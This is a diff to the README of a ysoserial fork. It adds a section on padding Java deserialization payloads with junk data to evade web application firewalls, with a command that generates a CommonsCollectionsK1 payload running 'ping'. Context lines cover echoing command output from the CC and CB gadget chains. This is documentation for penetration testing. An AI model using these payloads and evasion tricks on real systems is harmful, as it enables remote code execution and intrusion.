@@ -136,6 +136,15 @@ Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
      Vaadin1                        @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
 ```
 
+## 脏数据
+
+- 增加payload前包含一定长度的脏数据，在某些情况可以绕过WAF
+- 来源 https://github.com/woodpecker-framework/ysoserial-for-woodpecker
+
+```
+java -jar ysoserial-0.0.8-SNAPSHOT-all.jar CommonsCollectionsK1  "ping 114.114.114.114" --dirt-data-length 1000
+```
+
 ## 回显
 - CC链的回显修改createTemplatesImplEcho方法
 - CB链的回显在ysoserial包下新增一个ClassLoader，在其static代码块中修改即可
